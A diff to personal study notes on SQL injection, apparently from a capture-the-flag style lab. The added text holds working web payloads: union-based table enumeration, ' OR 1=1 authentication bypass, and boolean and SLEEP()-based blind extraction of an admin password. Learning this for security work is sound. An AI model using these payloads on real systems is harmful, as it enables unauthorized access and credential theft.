@@ -61,7 +61,7 @@ The first one will show only the first row of the table. The second one will ski
 SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;
 ```
 
-It will return `admin:pass123<br>martin:secret<br>jim:work456`.
+It will return something like `admin:pass123<br>martin:secret<br>jim:work456`.
 
 2. `CONCAT()`
 
@@ -69,7 +69,7 @@ It will return `admin:pass123<br>martin:secret<br>jim:work456`.
 SELECT CONCAT(username, ':', password) FROM users;
 ```
 
-It will return `admin:pass123`.
+It will return something like `admin:pass123`.
 
 And there is also `informatino_schema` database which is a database that contains information about other databases. Every database has it. And two tables from the `information_schema` database are useful.
 
@@ -110,17 +110,219 @@ Here are the basic commands to detect SQL injection
 - `'`
 - `"`
 - `;--`
-- `OR 1=1`
+- `OR 1=1` (or `OR 1=1;`)
 
 But not every website or database will be set to return errors, you have to check them yourself.
 
 ## In-Band SQL Injection
 
+### Error-Based SQL Injection
+
+This one is easy. You just put one of the common SQL injection detecting commands (like `'`), and then it will returns something like this:
+
+```sql-error
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1
+```
+
+### Union-Based SQL Injection
+
+For this, you just add `UNION SELECT` at the end of the original `SELECT` command. And these below steps go in order, step by step. Like trying one by one, until it works. And even in each step, there are multiple micro steps, you have to try that one by one too, until it works.
+
+1. Determining the number of columns
+
+Example:
+
+```sql-text
+1 UNION SELECT 1          -- error (wrong column count)
+1 UNION SELECT 1,2        -- error (still wrong)
+1 UNION SELECT 1,2,3      -- success! The table has 3 columns
+```
+
+2. Identifying which columns to display
+
+Example:
+
+```sql-text
+0 UNION SELECT 1,2,3
+```
+
+3. Extract the database name
+
+Example: 
+
+```sql-text
+0 UNION SELECT 1,2,database()
+```
+
+4. Enumerating tables
+
+Example:
+
+```sql-text
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'
+```
+
+5. Enumerating columns
+
+Example: 
+
+```sql-text
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
+```
+
+6. Extracting data
+
+Example: 
+
+```sql-text
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
+```
+
 ## Blind SQL Injection: Authentication Bypass
+
+Blind SQL injection is when you have no output or feedback when trying out normal SQL injection techniques. Normally, here is how authentication queries work:
+
+```sql-text
+SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
+```
+
+When you put in `' OR 1=1;--` to the username field, it will become this in the background:
+
+```sql-text
+SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
+```
+
+So, what's happening is:
+
+- `username=''` - It will check a condition where username is nothing, or there is no username
+- `OR 1=1` - A condition where 1 is equal to 1, which is always true
+- `;` - Ends the statement, (I often forget the semicolon when writing SQL queries)
+- `--` - Comment out the next word
+
+So basically, it is selecting everything from the `users` table where the username is `''` (nothing) or 1 is equal to 1, and it has commented out the password field.
+
+And you can target specific user too, like admin, with this `admin'--`. Here is the example:
+
+```sql-text
+SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;
+```
+
+The `' OR 1=1;--` is not the only payload you can try, you can try multiple ones when detecting SQL injection. Here they are:
+
+- `' OR 1=1;--` - This is the classic one.
+- `' OR 1=1#` - `#` as the comment character instead of `--`.
+- `" OR 1=1--` - Double quote `"` instead of `'`.
+- And trying both username and password fields.Some applications only concatenate only one of them.
 
 ## Blind SQL Injection: Boolean and Time Based
 
+These techniques are useful when you want to pull the actual data but the application gives you no visible output. This one is even more tedious than the other ones, because you have to try one character at a time to check if it works.
+
+## Boolean-Based Blind SQL Injection
+
+This is a true or false detection. For example, there is a feature that checks username in a website like `https://website.thm/checkuser?username=admin`, and it will return in true or false in JSON format like `{taken: true}` or `{taken: false}`. Here is a step by step guide:
+
+1. Confirming injection 
+
+```sql-text
+SELECT * FROM users WHERE username = 'admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';-- LIMIT 1;
+```
+This will return true since `%` is a wildcard that matches every database, so it will return `{taken: true}`.
+
+2. Confirming the database name. 
+
+```sql-text
+admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
+```
+
+You have to guess the name character by character by replacing the wildcard with specific letter, like `s%`, `sa%`, `sq%`, etc.
+
+3. Getting the table and column name.
+
+```sql-text
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
+```
+
+You have to guess the table name too. But many names are common. You can try those first. And at the end `users%` returns `true`, you can try without the wildcard to confirm if the table name `users` actually exist. 
+
+## Time-Based Blind SQL Injection
+
+This is useful when there is absolutely no visible output, not even boolean. When your signal is only seeing how long the response takes. There is a `SLEEP()` function in MYSQL that pauses execution for a set of number of seconds, wraps a condition around it and the database only pauses it when the condition is true.
+
+Here are some examples:
+
+```sql-text
+admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
+```
+
+If the database name starts with `s`, then the response would take for 5 seconds.
+
+Here is another one:
+
+```sql-text
+admin123' UNION SELECT SLEEP(5);--        -- no delay (wrong count)
+admin123' UNION SELECT SLEEP(5),2;--      -- 5 second delay (2 columns!)
+```
+
+You have to try it one by one like in Union-based detection, until you get the right response.
+
+Here is the scenario from the practical lab (from the task 6):
+
+1. Finding the column count. 
+
+```sql-text
+admin123' UNION SELECT SLEEP(5);--
+```
+
+```sql-text
+admin123' UNION SELECT SLEEP(5), 2;--
+```
+
+2. Getting the database name. You have to start from the beginning, or guess it.
+
+```sql-text
+admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--
+```
+
+```sql-text
+admin123' UNION SELECT SLEEP(5),2 where database() like 'sq%';--
+```
+
+```sql-text
+admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four';--
+```
+
+3. Enumerating the database names and columns.
+
+```sql-text
+admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'u%';--
+```
+
+```sql-text
+admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'us%';--
+```
+
+```sql-text
+admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users';--
+```
+
+4. Extracting the admin password.
+
+```sql-text
+admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4%';--
+```
+
+```sql-text
+admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '49%';--
+```
+
+```sql-text
+admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4961';--
+```
+
 ## Out-of-Band SQL Injection
+
+This one is used when everything else has failed.
 
 ## Remediation and Prevention
 
